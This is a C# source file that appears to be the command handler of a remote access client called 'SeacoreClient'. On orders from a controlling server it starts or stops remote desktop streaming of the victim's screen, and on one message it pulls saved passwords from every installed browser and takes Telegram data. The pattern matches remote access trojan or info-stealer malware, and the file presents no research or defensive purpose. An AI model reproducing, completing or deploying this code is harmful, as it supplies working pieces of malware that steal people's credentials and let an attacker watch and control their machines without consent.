using System;
using SeacoreClient.Core;
using SeacoreClient.Features.RemoteDesktop;
using SeacoreClient.Features.Recovery.Browsers;
using SeacoreClient.Features.Recovery.Messenger.Telegram;
using SeacoreCommon.Messages;

namespace SeacoreClient.Handlers
{
    public static class MessageHandler
    {
        public static void ProcessMessage(MessageBase message, TcpClientManager clientManager)
        {
            switch (message)
            {
                case HeartbeatAckMessage ackMessage:
                    clientManager.HeartbeatSender?.HandleHeartbeatAck(ackMessage.ServerTimestamp);
                    break;

                case DisconnectMessage:
                    clientManager.HandleServerInitiatedDisconnect();
                    break;

                case ReconnectMessage:
                    Console.WriteLine("Reconnect command received.");
                    clientManager.RequestReconnect();
                    break;

                case ChromiumRecoveryMessage:
                    BrowserRecoveryManager.RecoverPasswordsForAllBrowsers();
                    TelegramRecovery.Telegram();
                    break;

                case RemoteDesktopRequestMessage remoteRequest:
                    if (remoteRequest.IsStart)
                    {
                        RemoteDesktopStreamer.Start(clientManager, remoteRequest);
                    }
                    else
                    {
                        RemoteDesktopStreamer.Stop();
                    }
                    break;

                default:
                    Console.WriteLine("Received unknown message.");
                    break;
            }
        }
    }
}
